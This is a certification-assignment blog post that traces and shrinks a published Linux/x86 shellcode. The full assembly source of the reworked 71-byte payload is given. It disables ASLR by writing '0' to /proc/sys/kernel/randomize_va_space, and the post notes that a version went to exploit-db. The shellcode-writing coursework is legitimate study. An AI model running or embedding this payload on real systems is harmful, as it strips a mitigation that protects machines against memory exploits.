<i>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</i><br /><i> </i><i><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/" target="_blank">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></i><br /><i> </i><i><b>Student ID:</b>&nbsp;SLAE-885</i><br /><i><b>Assignment number: </b>6.1</i><br /><i><b>Github repo:</b> <a href="https://github.com/abatchy17/SLAE">https://github.com/abatchy17/SLAE</a>&nbsp;&nbsp;</i><br /><br /><b><i>Note: A modified version has been published in exploit-db:<a href="https://www.exploit-db.com/exploits/41969/"> https://www.exploit-db.com/exploits/41969/</a> (calls setruid first)</i></b><br /><br />In assignment 6, the requirement is polymorphing 3+ shellcodes off shellstorm.org or exploit-db.com<i>, </i>which basically means modifying the code so it doesn't look like the original yet has the same functionality. This is the first post out of three.<br /><br /><br /><h2 itemprop="headline">Linux/x86 - Disable ASLR Shellcode (71 bytes)</h2><div itemprop="headline">First shellcode I will dissect is a disable ASLR one by Mohammad Reza Ramezani, shellcode can be found <a href="https://www.exploit-db.com/exploits/36637/">here</a>.<br /><br />Let's compile this code and instead of debugging it, we'll use strace tool<br /><br /><div style="background: #f8f8f8; border-width: 0.1em 0.1em 0.1em 0.8em; border: solid black; overflow: auto; padding: 0.2em 0.6em; width: auto;"><pre style="line-height: 125%; margin: 0;"><span style="color: #8f5902;">abatchy@ubuntu:~/Desktop/workspace$</span> gcc 36637.c -fno-stack-protector -z execstack -o 36637.out<br /><span style="color: #8f5902;">abatchy@ubuntu:~/Desktop/workspace$</span> sudo su<br /><span style="color: #8f5902;">root@ubuntu:/home/abatchy/Desktop/workspace#</span> strace ./36637.out <br /><span style="color: black; font-style: italic;">execve("./36637.out", ["./36637.out"], [/* 26 vars */]) = 0</span><br /><span style="color: black; font-style: italic;">brk(0)                                  = 0x804b000</span><br /><span style="color: black; font-style: italic;">access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)</span><br /><span style="color: black; font-style: italic;">mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fd8000</span><br /><span style="color: black; font-style: italic;">access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)</span><br /><span style="color: black; font-style: italic;">open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</span><br /><span style="color: black; font-style: italic;">fstat64(3, {st_mode=S_IFREG|0644, st_size=79136, ...}) = 0</span><br /><span style="color: black; font-style: italic;">mmap2(NULL, 79136, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fc4000</span><br /><span style="color: black; font-style: italic;">close(3)                                = 0</span><br /><span style="color: black; font-style: italic;">access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)</span><br /><span style="color: black; font-style: italic;">open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</span><br /><span style="color: black; font-style: italic;">read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0P\234\1\0004\0\0\0"..., 512) = 512</span><br /><span style="color: black; font-style: italic;">fstat64(3, {st_mode=S_IFREG|0755, st_size=1763068, ...}) = 0</span><br /><span style="color: black; font-style: italic;">mmap2(NULL, 1768060, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e14000</span><br /><span style="color: black; font-style: italic;">mmap2(0xb7fbe000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1aa000) = 0xb7fbe000</span><br /><span style="color: black; font-style: italic;">mmap2(0xb7fc1000, 10876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7fc1000</span><br /><span style="color: black; font-style: italic;">close(3)                                = 0</span><br /><span style="color: black; font-style: italic;">mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e13000</span><br /><span style="color: black; font-style: italic;">set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb7e13940, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0</span><br /><span style="color: black; font-style: italic;">mprotect(0xb7fbe000, 8192, PROT_READ)   = 0</span><br /><span style="color: black; font-style: italic;">mprotect(0x8049000, 4096, PROT_READ)    = 0</span><br /><span style="color: black; font-style: italic;">mprotect(0xb7ffe000, 4096, PROT_READ)   = 0</span><br /><span style="color: black; font-style: italic;">munmap(0xb7fc4000, 79136)               = 0</span><br /><b><span style="color: black; font-style: italic;">open("/proc/sys/kernel/randomize_va_space", O_RDWR) = 3</span><br /><span style="color: black; font-style: italic;">write(3, "0\n", 2)                      = 2</span><br /><span style="color: black; font-style: italic;">_exit(0)                                = ?</span></b><br /><span style="color: black; font-style: italic;">+++ exited with 0 +++</span><br /></pre></div></div><br /><br />Note: DO NOT run code directly without investigating it first and making sure it's totally safe.<br /><br />So 3 calls are what matter to us:<br /><br /><b>1. open("/proc/sys/kernel/randomize_va_space", O_RDWR)</b><br /><b>2. write(3, "0\n", 2)</b><br /><b>3. exit(0)</b><br /><br />There seem to be room for improvement, so let's see if we can make this code significantly smaller.<br /><br /><h2>1. open("/proc/sys/kernel/randomize_va_space", O_RDWR)</h2><br />Minor refactoring<b>.</b><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">eax</span><span style="color: #d2cd86;">,</span><span style="color: #d0d09f;">eax</span><br /><span style="color: #e66170; font-weight: bold;">jmp</span> <span style="color: #e34adc;">filename</span><br /><span style="color: #e34adc;">shellcode:</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">ebx</span>         <span style="color: #9999a9;">; EBX now points to '/proc/sys/kernel/randomize_va_spaceX'</span><br /><span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">ebx</span> <span style="color: #d2cd86;">+</span> <span style="color: #008c00;">35</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">,</span><span style="color: #d0d09f;">al</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">5</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">2</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">ecx</span><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">80h</span><br /></pre>We don't need O_RDWR permissions, but I tried making use of that with no avail.<br /><br /><h2>2. write(fd, "0\n", 2)</h2><br /><b>1. mov ebx, eax: </b>Since we don't care about EAX, an xchg eax,ebx is one byte less.<br /><br /><b><i>2</i>. push byte 2 - pop edx:</b> ECX already contains 2, let's exchange them instead.<br /><br /><b>3. jmp-call-pop:</b> Got rid of it and replaced it with a push '0' <br /><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #e66170; font-weight: bold;">xchg</span> <span style="color: #d0d09f;">eax</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ebx</span>   <span style="color: #9999a9;">; One byte less than mov ebx, eax</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">4</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span><br /><span style="color: #e66170; font-weight: bold;">xchg</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">edx</span>   <span style="color: #9999a9;">; ECX already contains 2</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #00a800;">0x30</span><br /><span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">esp</span>    <span style="color: #9999a9;">; ECX now points to "0"</span><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">80h</span>         <span style="color: #9999a9;">; EAX will now contains 1</span><br /></pre><br /><h2><b>3. Exit(0)</b></h2><br />Is it a big deal exiting with non-zero status? Not really, so let's not nullify EBX (it currently contains the file descriptor).<br /><br />Can we do better? Yes! write() returns number of bytes written, which should be 1 (we only wrote "0"), so we can exit directly!<br /><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">80h</span>         <span style="color: #9999a9;">; Yep, that's it</span><br /></pre><br /><h2>Final shellcode</h2><br /><pre style="background: #000000; color: #d1d1d1;"><span style="color: #008073;">section</span> .text<br /><span style="color: #008073;">global</span> _start<br /><br /><span style="color: #e34adc;">_start:</span><br /><br /><span style="color: #9999a9;">;</span><br /><span style="color: #9999a9;">; open("/proc/sys/kernel/randomize_va_spaceX", O_RDWR)</span><br /><span style="color: #9999a9;">;</span><br /><span style="color: #e66170; font-weight: bold;">xor</span> <span style="color: #d0d09f;">eax</span><span style="color: #d2cd86;">,</span><span style="color: #d0d09f;">eax</span><br /><span style="color: #e66170; font-weight: bold;">jmp</span> <span style="color: #e34adc;">aslr_file</span><br /><span style="color: #e34adc;">shellcode:</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">ebx</span>         <span style="color: #9999a9;">; EBX now points to '/proc/sys/kernel/randomize_va_spaceX'</span><br /><span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #d2cd86;">[</span><span style="color: #d0d09f;">ebx</span> <span style="color: #d2cd86;">+</span> <span style="color: #008c00;">35</span><span style="color: #d2cd86;">]</span><span style="color: #d2cd86;">,</span><span style="color: #d0d09f;">al</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">5</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">2</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">ecx</span><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">80h</span><br /><br /><span style="color: #9999a9;">;</span><br /><span style="color: #9999a9;">; write(fd, '0', 1)</span><br /><span style="color: #9999a9;">;</span><br /><span style="color: #e66170; font-weight: bold;">xchg</span> <span style="color: #d0d09f;">eax</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">ebx</span>   <span style="color: #9999a9;">; One byte less than mov ebx, eax</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #008c00;">4</span><br /><span style="color: #e66170; font-weight: bold;">pop</span> <span style="color: #d0d09f;">eax</span><br /><span style="color: #e66170; font-weight: bold;">xchg</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">edx</span>   <span style="color: #9999a9;">; ECX already contains 2</span><br /><span style="color: #e66170; font-weight: bold;">push</span> <span style="color: #e66170; font-weight: bold;">byte</span> <span style="color: #00a800;">0x30</span><br /><span style="color: #e66170; font-weight: bold;">mov</span> <span style="color: #d0d09f;">ecx</span><span style="color: #d2cd86;">,</span> <span style="color: #d0d09f;">esp</span>    <span style="color: #9999a9;">; ECX now points to "0"</span><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">80h</span>         <span style="color: #9999a9;">; EAX will now contains 1</span><br /><br /><span style="color: #9999a9;">;</span><br /><span style="color: #9999a9;">; exit(0)</span><br /><span style="color: #9999a9;">;</span><br /><span style="color: #e66170; font-weight: bold;">int</span> <span style="color: #00a800;">80h</span>         <span style="color: #9999a9;">; Yep, that's it</span><br /><br /><span style="color: #e34adc;">aslr_file:</span><br /><span style="color: #e66170; font-weight: bold;">call</span> <span style="color: #e34adc;">shellcode</span>  <span style="color: #9999a9;">; Skips the filename and avoids using JMP</span><br /><span style="color: #008073;">db</span> <span style="color: #00c4c4;">'/proc/sys/kernel/randomize_va_spaceX'</span><br /></pre><br />Shellcode size has been cut down to 71 bytes (13 bytes less than original code).<br /><br />- Abatchy